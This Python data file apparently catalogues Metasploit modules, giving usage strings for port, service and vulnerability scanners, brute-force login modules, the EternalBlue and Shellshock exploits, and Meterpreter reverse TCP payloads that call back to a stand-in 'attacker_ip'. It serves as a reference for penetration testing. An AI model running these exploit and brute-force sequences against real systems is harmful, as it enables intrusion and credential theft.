MODULES_DB = [
    # PORT SCANNING MODULES
    {
        "name": "TCP Port Scanner",
        "path": "auxiliary/scanner/portscan/tcp",
        "category": "Port Scanning",
        "description": "Basic TCP port scanner to identify open ports",
        "targets": ["Any", "Network"],
        "tags": ["tcp", "port", "scan", "network", "reconnaissance"],
        "usage": "use auxiliary/scanner/portscan/tcp\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS", "TIMEOUT"]
    },
    {
        "name": "SYN Port Scanner",
        "path": "auxiliary/scanner/portscan/syn",
        "category": "Port Scanning",
        "description": "Fast SYN port scanner for stealth scanning",
        "targets": ["Any", "Network"],
        "tags": ["syn", "port", "scan", "stealth", "fast"],
        "usage": "use auxiliary/scanner/portscan/syn\nset RHOSTS target_ip\nset PORTS 1-65535\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
    },
    {
        "name": "ACK Port Scanner",
        "path": "auxiliary/scanner/portscan/ack",
        "category": "Port Scanning",
        "description": "ACK port scanner to identify filtered ports",
        "targets": ["Any", "Network"],
        "tags": ["ack", "port", "scan", "firewall", "filtered"],
        "usage": "use auxiliary/scanner/portscan/ack\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE"]
    },
    
    # SMB SCANNING MODULES
    {
        "name": "SMB Version Scanner",
        "path": "auxiliary/scanner/smb/smb_version",
        "category": "Service Scanning",
        "description": "Scan for SMB version information",
        "targets": ["Windows", "SMB", "Network"],
        "tags": ["smb", "version", "windows", "shares"],
        "usage": "use auxiliary/scanner/smb/smb_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain"]
    },
    {
        "name": "SMB MS17-010 Scanner",
        "path": "auxiliary/scanner/smb/smb_ms17_010",
        "category": "Vulnerability Scanning",
        "description": "Scan for MS17-010 EternalBlue vulnerability",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "smb", "vulnerability", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "CHECK_ARCH", "CHECK_DOPU", "CHECK_PIPE"]
    },
    {
        "name": "SMB Share Scanner",
        "path": "auxiliary/scanner/smb/smb_enumshares",
        "category": "Service Scanning",
        "description": "Enumerate SMB shares on target systems",
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "shares", "enumerate", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain", "LogSpider"]
    },
    
    # SSH SCANNING MODULES
    {
        "name": "SSH Version Scanner",
        "path": "auxiliary/scanner/ssh/ssh_version",
        "category": "Service Scanning",
        "description": "Scan for SSH version information",
        "targets": ["Linux", "SSH", "Network"],
        "tags": ["ssh", "version", "linux", "remote"],
        "usage": "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TIMEOUT"]
    },
    {
        "name": "SSH Login Scanner",
        "path": "auxiliary/scanner/ssh/ssh_login",
        "category": "Brute Force",
        "description": "Brute force SSH login credentials",
        "targets": ["Linux", "SSH"],
        "tags": ["ssh", "brute", "login", "credentials", "password"],
        "usage": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nset USERNAME root\nset PASSWORD_FILE /path/to/passwords.txt\nrun",
        "options": ["RHOSTS", "USERNAME", "PASSWORD", "USERPASS_FILE", "USER_FILE", "PASS_FILE"]
    },
    
    # HTTP/WEB SCANNING MODULES
    {
        "name": "HTTP Version Scanner",
        "path": "auxiliary/scanner/http/http_version",
        "category": "Service Scanning",
        "description": "Scan for HTTP server version information",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "web", "version", "server"],
        "usage": "use auxiliary/scanner/http/http_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "VHOST", "SSL"]
    },
    {
        "name": "Directory Scanner",
        "path": "auxiliary/scanner/http/dir_scanner",
        "category": "Web Scanning",
        "description": "Scan for common directories on web servers",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "directory", "web", "enumeration"],
        "usage": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "PATH", "DICTIONARY"]
    },
    {
        "name": "Files and Directories Scanner",
        "path": "auxiliary/scanner/http/files_dir",
        "category": "Web Scanning",
        "description": "Scan for files and directories on web servers",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "files", "directories", "web"],
        "usage": "use auxiliary/scanner/http/files_dir\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "PATH", "EXT", "DICTIONARY"]
    },
    {
        "name": "HTTP Title Scanner",
        "path": "auxiliary/scanner/http/title",
        "category": "Web Scanning",
        "description": "Scan for HTTP page titles",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "title", "web", "reconnaissance"],
        "usage": "use auxiliary/scanner/http/title\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "SSL"]
    },
    
    # FTP SCANNING MODULES
    {
        "name": "FTP Version Scanner",
        "path": "auxiliary/scanner/ftp/ftp_version",
        "category": "Service Scanning",
        "description": "Scan for FTP server version information",
        "targets": ["FTP", "Network"],
        "tags": ["ftp", "version", "server"],
        "usage": "use auxiliary/scanner/ftp/ftp_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "Anonymous FTP Scanner",
        "path": "auxiliary/scanner/ftp/anonymous",
        "category": "Service Scanning",
        "description": "Check for anonymous FTP access",
        "targets": ["FTP"],
        "tags": ["ftp", "anonymous", "access"],
        "usage": "use auxiliary/scanner/ftp/anonymous\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "FTPUSER", "FTPPASS"]
    },
    
    # DNS SCANNING MODULES
    {
        "name": "DNS Enumeration",
        "path": "auxiliary/gather/dns_enum",
        "category": "Information Gathering",
        "description": "Enumerate DNS information for a domain",
        "targets": ["DNS", "Network"],
        "tags": ["dns", "enumeration", "domain", "subdomain"],
        "usage": "use auxiliary/gather/dns_enum\nset DOMAIN example.com\nrun",
        "options": ["DOMAIN", "NS", "ENUM_AXFR", "ENUM_TLD", "ENUM_SRV"]
    },
    
    # SNMP SCANNING MODULES
    {
        "name": "SNMP Enumeration",
        "path": "auxiliary/scanner/snmp/snmp_enum",
        "category": "Service Scanning",
        "description": "Enumerate SNMP information",
        "targets": ["SNMP", "Network"],
        "tags": ["snmp", "enumeration", "community"],
        "usage": "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "COMMUNITY", "VERSION"]
    },
    {
        "name": "SNMP Login Scanner",
        "path": "auxiliary/scanner/snmp/snmp_login",
        "category": "Brute Force",
        "description": "Brute force SNMP community strings",
        "targets": ["SNMP"],
        "tags": ["snmp", "brute", "community", "login"],
        "usage": "use auxiliary/scanner/snmp/snmp_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PASS_FILE", "VERSION"]
    },
    
    # DATABASE SCANNING MODULES
    {
        "name": "MySQL Version Scanner",
        "path": "auxiliary/scanner/mysql/mysql_version",
        "category": "Database Scanning",
        "description": "Scan for MySQL version information",
        "targets": ["MySQL", "Database"],
        "tags": ["mysql", "database", "version"],
        "usage": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "MySQL Login Scanner",
        "path": "auxiliary/scanner/mysql/mysql_login",
        "category": "Database Scanning",
        "description": "Brute force MySQL login credentials",
        "targets": ["MySQL", "Database"],
        "tags": ["mysql", "database", "brute", "login"],
        "usage": "use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target_ip\nset USERNAME root\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
    },
    {
        "name": "MSSQL Login Scanner",
        "path": "auxiliary/scanner/mssql/mssql_login",
        "category": "Database Scanning",
        "description": "Brute force MSSQL login credentials",
        "targets": ["MSSQL", "Database", "Windows"],
        "tags": ["mssql", "database", "brute", "login", "windows"],
        "usage": "use auxiliary/scanner/mssql/mssql_login\nset RHOSTS target_ip\nset USERNAME sa\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
    },
    
    # VULNERABILITY SCANNERS
    {
        "name": "OpenSSL Heartbleed Scanner",
        "path": "auxiliary/scanner/ssl/openssl_heartbleed",
        "category": "Vulnerability Scanning",
        "description": "Scan for OpenSSL Heartbleed vulnerability",
        "targets": ["SSL", "OpenSSL"],
        "tags": ["heartbleed", "ssl", "openssl", "vulnerability"],
        "usage": "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TLS_CALLBACK", "TLS_VERSION"]
    },
    {
        "name": "SSL Certificate Scanner",
        "path": "auxiliary/scanner/ssl/ssl_version",
        "category": "Service Scanning",
        "description": "Scan SSL/TLS version and certificate information",
        "targets": ["SSL", "TLS"],
        "tags": ["ssl", "tls", "certificate", "version"],
        "usage": "use auxiliary/scanner/ssl/ssl_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    
    # EXPLOITATION MODULES
    {
        "name": "EternalBlue Exploit",
        "path": "exploit/windows/smb/ms17_010_eternalblue",
        "category": "Exploitation",
        "description": "Exploit MS17-010 EternalBlue vulnerability",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "exploit", "windows"],
        "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nrun",
        "options": ["RHOSTS", "RPORT", "GroomAllocations", "GroomDelta"]
    },
    {
        "name": "Shellshock Exploit",
        "path": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "category": "Exploitation",
        "description": "Exploit Shellshock vulnerability in CGI scripts",
        "targets": ["Linux", "Apache", "CGI"],
        "tags": ["shellshock", "bash", "cgi", "exploit"],
        "usage": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target_ip\nset TARGETURI /cgi-bin/vulnerable.cgi\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "METHOD"]
    },
    
    # PAYLOADS
    {
        "name": "Windows Meterpreter Reverse TCP",
        "path": "payload/windows/meterpreter/reverse_tcp",
        "category": "Payloads",
        "description": "Windows Meterpreter reverse TCP payload",
        "targets": ["Windows"],
        "tags": ["meterpreter", "windows", "reverse", "tcp", "payload"],
        "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT", "EXITFUNC"]
    },
    {
        "name": "Linux Meterpreter Reverse TCP",
        "path": "payload/linux/x86/meterpreter/reverse_tcp",
        "category": "Payloads",
        "description": "Linux Meterpreter reverse TCP payload",
        "targets": ["Linux"],
        "tags": ["meterpreter", "linux", "reverse", "tcp", "payload"],
        "usage": "set payload linux/x86/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    }
]
